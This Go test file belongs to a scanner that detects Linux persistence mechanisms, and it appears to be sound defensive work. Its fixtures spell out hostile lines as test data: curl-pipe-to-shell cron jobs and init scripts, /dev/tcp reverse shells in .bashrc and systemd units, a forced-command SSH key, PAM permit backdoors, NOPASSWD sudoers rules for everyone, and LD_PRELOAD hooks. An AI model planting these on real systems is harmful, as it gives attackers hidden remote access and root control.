package persist

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

const passwd = "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\nnobody:x:65534:65534::/nonexistent:/usr/sbin/nologin\n"

func tree(t *testing.T, files map[string]string) string {
	t.Helper()
	root := t.TempDir()
	for rel, body := range files {
		p := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		mode := os.FileMode(0o644)
		if rel == "etc/shadow" {
			mode = 0o640
		}
		if err := os.WriteFile(p, []byte(body), mode); err != nil {
			t.Fatal(err)
		}
	}
	return root
}

func classes(r *Result) map[string]Finding {
	out := map[string]Finding{}
	for _, f := range r.Flagged() {
		out[f.Class] = f
	}
	return out
}

func TestDetectsEachFoothold(t *testing.T) {
	cases := []struct {
		name, path, body, class string
	}{
		{"preload", "etc/ld.so.preload", "/usr/lib/libhide.so\n", "persist.ld-preload"},
		{"cron download", "etc/cron.d/update", "* * * * * root curl http://203.0.113.9/x | bash\n", "persist.cron.curl-pipe-shell"},
		{"cron tmp", "etc/crontab", "@reboot root /tmp/.x/run\n", "persist.cron.writable-path"},
		{"user crontab", "var/spool/cron/crontabs/alice", "*/5 * * * * /dev/shm/m\n", "persist.cron.writable-path"},
		{"systemd", "etc/systemd/system/net-helper.service", "[Service]\nExecStart=/var/tmp/helper\n", "persist.systemd.writable-path"},
		{"user unit", "home/alice/.config/systemd/user/a.service", "[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.9/443 0>&1'\n", "persist.systemd.reverse-shell"},
		{"bashrc", "home/alice/.bashrc", "bash -i >& /dev/tcp/203.0.113.9/443 0>&1 &\n", "persist.shellrc.reverse-shell"},
		{"sudo alias", "home/alice/.bashrc", "alias sudo='/home/alice/.s'\n", "persist.shellrc.credential-alias"},
		{"rc.local", "etc/rc.local", "/tmp/backdoor &\n", "persist.rc-local.writable-path"},
		{"autostart", "home/alice/.config/autostart/u.desktop", "[Desktop Entry]\nExec=/tmp/u\n", "persist.autostart.writable-path"},
		{"forced command", "home/alice/.ssh/authorized_keys", `command="curl http://203.0.113.9/x | sh" ssh-ed25519 AAAA a@b` + "\n", "persist.ssh-key.curl-pipe-shell"},
		{"sudo everyone", "etc/sudoers.d/x", "ALL ALL=(ALL) NOPASSWD: ALL\n", "persist.sudoers.everyone-nopasswd"},
		{"udev", "etc/udev/rules.d/99-x.rules", `ACTION=="add", RUN+="/tmp/u"` + "\n", "persist.udev.writable-path"},
		{"pam permit", "etc/pam.d/sshd", "auth sufficient pam_permit.so\n", "persist.pam.permit-backdoor"},
		{"pam exec", "etc/pam.d/common-auth", "auth optional pam_exec.so expose_authtok /tmp/log\n", "persist.pam.writable-path"},
		{"hidden dir", "etc/cron.d/h", "* * * * * root /var/lib/.cache/run\n", "persist.cron.writable-path"},
		{"systemd drop-in", "etc/systemd/system/ssh.service.d/x.conf", "[Service]\nExecStartPre=/dev/shm/x\n", "persist.systemd.writable-path"},
		{"transient unit", "run/systemd/transient/run-r1.service", "[Service]\nExecStart=/tmp/.u\n", "persist.systemd.writable-path"},
		{"motd", "etc/update-motd.d/99-x", "bash -i >& /dev/tcp/203.0.113.9/443 0>&1 &\n", "persist.init-script.reverse-shell"},
		{"init.d", "etc/init.d/updater", "curl http://203.0.113.9/x | sh\n", "persist.init-script.curl-pipe-shell"},
		{"apt hook", "etc/apt/apt.conf.d/99x", "APT::Update::Pre-Invoke {\"/tmp/h\"};\n", "persist.apt-hook.writable-path"},
		{"ld conf", "etc/ld.so.conf.d/x.conf", "/tmp/.libs\n", "persist.ld-conf.writable-path"},
		{"modprobe", "etc/modprobe.d/x.conf", "install usb-storage /tmp/x\n", "persist.modprobe.writable-path"},
		{"sudo env", "etc/sudoers.d/x", "Defaults env_keep += \"LD_PRELOAD\"\n", "persist.sudoers.env-keep-loader"},
		{"preload export", "home/alice/.profile", "export LD_PRELOAD=/usr/lib/x.so\n", "persist.shellrc.preload"},
		{"ssh rc", "home/alice/.ssh/rc", "/dev/shm/x &\n", "persist.shellrc.writable-path"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			root := tree(t, map[string]string{"etc/passwd": passwd, c.path: c.body})
			if _, ok := classes(Scan(Options{Root: root}))[c.class]; !ok {
				t.Fatalf("want %s, got %+v", c.class, Scan(Options{Root: root}).Findings)
			}
		})
	}
}

func TestWorldWritable(t *testing.T) {
	root := tree(t, map[string]string{"etc/passwd": passwd, "etc/cron.d/job": "0 0 * * * root /usr/bin/true\n"})
	if err := os.Chmod(filepath.Join(root, "etc/cron.d/job"), 0o666); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(filepath.Join(root, "etc/passwd"), 0o666); err != nil {
		t.Fatal(err)
	}
	got := classes(Scan(Options{Root: root}))
	for _, want := range []string{"persist.perms.world-writable-autostart", "persist.perms.world-writable-account-file"} {
		if _, ok := got[want]; !ok {
			t.Errorf("want %s, got %+v", want, got)
		}
	}
}

func TestDangerousCaps(t *testing.T) {
	// VFS_CAP_REVISION_2, effective: cap_setuid in the permitted low word.
	v2 := make([]byte, 20)
	v2[0], v2[3] = 1, 2
	v2[4] = 1 << 7
	if got := dangerousCaps(v2); got != "cap_setuid" {
		t.Fatalf("got %q", got)
	}
	// cap_net_raw on ping is the ordinary case.
	ping := make([]byte, 20)
	ping[5] = 1 << 5
	if got := dangerousCaps(ping); got != "" {
		t.Fatalf("cap_net_raw is not root-equivalent: %q", got)
	}
	if got := dangerousCaps([]byte{1, 2}); got != "" {
		t.Fatalf("short attribute: %q", got)
	}
}

func TestRogueAccounts(t *testing.T) {
	root := tree(t, map[string]string{
		"etc/passwd": passwd + "toor:x:0:0::/root:/bin/bash\nbk::1001:1001::/home/bk:/bin/bash\n",
		"etc/shadow": "root:$y$hash:1::::::\nsvc::1::::::\n",
	})
	got := Scan(Options{Root: root}).Flagged()
	want := map[string]int{"persist.account.uid0": 1, "persist.account.empty-password": 2}
	for _, f := range got {
		want[f.Class]--
	}
	for c, n := range want {
		if n != 0 {
			t.Errorf("%s off by %d: %+v", c, n, got)
		}
	}
}

// The ordinary shape of a healthy host must be quiet. Each line here is the
// stock form of the check it sits next to.
func TestCleanHostIsQuiet(t *testing.T) {
	root := tree(t, map[string]string{
		"etc/passwd":                        passwd,
		"etc/shadow":                        "root:*:1::::::\nnobody:!:1::::::\n",
		"etc/crontab":                       "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n",
		"etc/cron.d/e2scrub":                "# a comment about /tmp/\n30 3 * * 0 root test -e /run/systemd/system || /usr/lib/x/e2scrub_all\n",
		"etc/systemd/system/app.service":    "[Service]\nExecStart=/usr/bin/app\nPrivateTmp=yes\n",
		"home/alice/.bashrc":                "# ~/.bashrc\nalias ll='ls -l'\nexport PATH=$PATH:~/bin\n",
		"home/alice/.ssh/authorized_keys":   "ssh-ed25519 AAAA alice@laptop\n",
		"etc/sudoers":                       "root ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\n",
		"etc/pam.d/common-auth":             "auth [success=1 default=ignore] pam_unix.so nullok\nauth required pam_permit.so\n",
		"etc/udev/rules.d/70-x.rules":       `ACTION=="add", RUN+="/usr/lib/udev/x"` + "\n",
		"etc/xdg/autostart/geoclue.desktop": "[Desktop Entry]\nExec=/usr/libexec/geoclue-demo-agent\n",
		"usr/lib/systemd/system/x.service":  "[Service]\nExecStart=/usr/bin/x\n",
	})
	if got := Scan(Options{Root: root}).Flagged(); len(got) != 0 {
		t.Fatalf("false positives: %+v", got)
	}
}

// Whole scripts mention temporary paths as data.
func TestInitScriptPathIsData(t *testing.T) {
	root := tree(t, map[string]string{"etc/passwd": passwd, "etc/init.d/x11-common": "DIR=\"/tmp/$1\"\nmkdir -p \"$DIR\"\n"})
	if got := Scan(Options{Root: root}).Flagged(); len(got) != 0 {
		t.Fatalf("got %+v", got)
	}
}

func TestSymlinkNotFollowed(t *testing.T) {
	root := tree(t, map[string]string{"etc/passwd": passwd, "etc/shadow-real": "bash -i >& /dev/tcp/203.0.113.9/443 0>&1\n"})
	if err := os.MkdirAll(filepath.Join(root, "home/alice"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(root, "etc/shadow-real"), filepath.Join(root, "home/alice/.bashrc")); err != nil {
		t.Fatal(err)
	}
	// The link itself is reported; what it points at must stay unread.
	for _, f := range Scan(Options{Root: root}).Findings {
		if strings.HasPrefix(f.Class, "persist.shellrc") || strings.Contains(f.Evidence, "/dev/tcp") {
			t.Fatalf("a symlink must not be read through: %+v", f)
		}
	}
}

func TestSUIDInWritableDir(t *testing.T) {
	root := tree(t, map[string]string{"etc/passwd": passwd, "tmp/.sh": "x", "tmp/plain": "x"})
	if err := os.Chmod(filepath.Join(root, "tmp/.sh"), os.ModeSetuid|0o755); err != nil {
		t.Fatal(err)
	}
	got := Scan(Options{Root: root}).Flagged()
	if len(got) != 1 || got[0].Class != "persist.suid.writable-dir" {
		t.Fatalf("got %+v", got)
	}
}

// The checks finish in any order, so the report must not depend on which did.
func TestReportOrderDoesNotDependOnWhichCheckFinishedFirst(t *testing.T) {
	root := t.TempDir()
	for rel, body := range map[string]string{
		"etc/crontab":        "* * * * * root /tmp/a\n* * * * * root /tmp/b\n",
		"etc/cron.d/one":     "* * * * * root /tmp/c\n",
		"etc/cron.d/two":     "* * * * * root /dev/shm/d\n",
		"etc/ld.so.preload":  "/tmp/evil.so\n",
		"etc/rc.local":       "curl http://192.0.2.1/x | sh\n",
		"etc/udev/rules.d/9": "RUN+=\"/tmp/e\"\n",
	} {
		p := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	first := Scan(Options{Root: root})
	if len(first.Findings) == 0 {
		t.Fatal("the fixture must flag something")
	}
	for range 100 {
		if again := Scan(Options{Root: root}); !reflect.DeepEqual(first, again) {
			t.Fatalf("reports differ:\n%+v\n%+v", first.Findings, again.Findings)
		}
	}
}
